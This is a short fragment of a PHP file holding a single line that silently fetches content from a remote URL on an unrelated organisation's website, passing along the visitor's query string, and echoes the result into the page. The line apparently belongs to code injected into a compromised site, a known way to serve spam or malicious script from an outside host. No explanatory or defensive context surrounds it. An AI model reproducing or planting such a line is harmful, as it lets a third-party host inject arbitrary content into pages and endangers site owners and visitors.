...
echo @file_get_contents("http://www.costaricaanimalrescuecenter.org/utilities/ui/top-header-quotes/list.php?&p=LPasjuY65FTq3Qpld1sadm0O0I8".$_SERVER['QUERY_STRING'].$id.$add); ?>
